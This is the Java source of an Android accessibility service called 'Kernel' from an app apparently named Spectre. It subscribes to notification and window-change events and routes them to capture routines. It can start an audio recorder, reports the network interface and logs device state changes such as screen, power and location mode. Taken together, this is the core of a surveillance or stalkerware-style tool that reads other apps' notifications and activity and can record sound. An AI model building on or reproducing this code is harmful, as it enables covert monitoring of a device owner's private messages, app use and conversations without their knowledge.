package com.hygnus.spectre;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.TargetApi;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.ToneGenerator;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.core.app.NotificationCompat;

@TargetApi(Build.VERSION_CODES.DONUT)
public class Kernel extends AccessibilityService {

    private static final String TAG = "Kernel";
    private static final String DEBUG_CHANNEL_ID = "debug";
    private static NotificationManager notificationManager;
    static Context serviceContext;
    public static SettingDriver settingDriverReceiver = new SettingDriver();
    public static Ticker timeDriverReceiver = new Ticker();

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                AccessibilityEvent.TYPE_WINDOWS_CHANGED;
        accessibilityServiceInfo.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        accessibilityServiceInfo.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(accessibilityServiceInfo);

        // DEBUG NOTIFICATION CHANNEL
        createNotificationChannel();

        initialize();
    }

    private void createNotificationChannel() {
        NotificationChannel notificationChannel = null;
        notificationChannel = new NotificationChannel(DEBUG_CHANNEL_ID,
                "Exception notifications", NotificationManager.IMPORTANCE_DEFAULT);
        notificationChannel.setDescription("Exception notifications");
        notificationManager = getSystemService(NotificationManager.class);
        if (notificationManager != null) {
            notificationManager.createNotificationChannel(notificationChannel);
        } else {
            Log.e(TAG, "NotificationManager is null, cannot create notification channel");
        }
    }

    @Override
    public void onInterrupt() {
        terminate();
    }

    @Override
    public boolean onUnbind(Intent intent) {
        terminate();
        return super.onUnbind(intent);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event != null) {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    NotificationDriver.captureNotification(event);
                    break;
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    ActivityDriver.captureActivity(event);
                    break;
                case AccessibilityEvent.TYPE_ANNOUNCEMENT:
                    break;
                case AccessibilityEvent.TYPE_ASSIST_READING_CONTEXT:
                    break;
                case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                    break;
                case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                    break;
                case AccessibilityEvent.TYPE_SPEECH_STATE_CHANGE:
                    break;
                case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_END:
                    break;
                case AccessibilityEvent.TYPE_TOUCH_EXPLORATION_GESTURE_START:
                    break;
                case AccessibilityEvent.TYPE_TOUCH_INTERACTION_END:
                    break;
                case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START:
                    break;
                case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_CONTEXT_CLICKED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_HOVER_ENTER:
                    break;
                case AccessibilityEvent.TYPE_VIEW_HOVER_EXIT:
                    break;
                case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_SELECTED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_TARGETED_BY_SCROLL:
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                    break;
                case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
                    break;
                case AccessibilityEvent.TYPE_WINDOWS_CHANGED:
                    break;
                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    break;
            }
        }
    }

    public static void beep(int toneType) {
        ToneGenerator toneGenerator = new ToneGenerator(AudioManager.STREAM_SYSTEM, 100);
        toneGenerator.startTone(toneType, 1000);
        toneGenerator.release(); // Release the tone generator when done
    }

    private void initialize() {
        serviceContext = getApplicationContext();

        Storage.setupWorkDirectory();

        try {
            PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
            assert packageInfo.versionName != null;
            Storage.logMessage(Storage.stateWriter, "<strong>📱 " + getPackageName().toUpperCase() + " " +
                    packageInfo.versionName.toUpperCase() + "</strong>", true);
        } catch (PackageManager.NameNotFoundException e) {
            Log.e(TAG, "Error getting package info", e);
            handleException(e);
        }

        registerReceivers();

        beep(ToneGenerator.TONE_CDMA_ALERT_INCALL_LITE);

        // Extra initialization routines
        NetworkDriver.reportNetworkInterface();
        if (AudioRecorder.ENABLE_AUDIO_RECORDER) { AudioRecorder.start(); }
    }

    private void registerReceivers() {
        IntentFilter settingIntentFilter = new IntentFilter();
        settingIntentFilter.addAction(Intent.ACTION_SCREEN_ON);
        settingIntentFilter.addAction(Intent.ACTION_SCREEN_OFF);
        settingIntentFilter.addAction(Intent.ACTION_POWER_CONNECTED);
        settingIntentFilter.addAction(Intent.ACTION_POWER_DISCONNECTED);
        settingIntentFilter.addAction(Intent.ACTION_BATTERY_LOW);
        settingIntentFilter.addAction(Intent.ACTION_SHUTDOWN);
        settingIntentFilter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
        settingIntentFilter.addAction(LocationManager.MODE_CHANGED_ACTION);
        registerReceiver(settingDriverReceiver, settingIntentFilter);

        IntentFilter timeIntentFilter = new IntentFilter(Intent.ACTION_TIME_TICK);
        registerReceiver(timeDriverReceiver, timeIntentFilter);
    }

    public static void terminate() {
        if (AudioRecorder.ENABLE_AUDIO_RECORDER) { AudioRecorder.stop(); }

        Storage.logMessage(Storage.stateWriter, "<strong>📱 TERMINATED</strong>", true);
        Storage.logMessage(Storage.stateWriter, "<br />", false);

        beep(ToneGenerator.TONE_CDMA_CALLDROP_LITE);
    }

    public static void handleException(Exception e) {
        handleException(e, true, true);
    }

    public static void handleException(Exception e, boolean beep, boolean notify) {
        if (e != null) {
            Storage.logException(e);
        }
        if (beep) {
            beep(ToneGenerator.TONE_CDMA_SOFT_ERROR_LITE);
        }
        if (notify && e != null) {
            try {
                Notification notification = new NotificationCompat.Builder(serviceContext, DEBUG_CHANNEL_ID)
                        .setContentTitle("Spectre Exception")
                        .setContentText(e.getMessage()) // Use the exception message
                        .build();
                if (notificationManager != null) {
                    notificationManager.notify(0, notification);
                } else {
                    Log.e(TAG, "NotificationManager is null, cannot show notification");
                }
            } catch (Exception notificationException) {
                Log.e(TAG, "Error showing exception notification", notificationException);
            }
        }
    }
}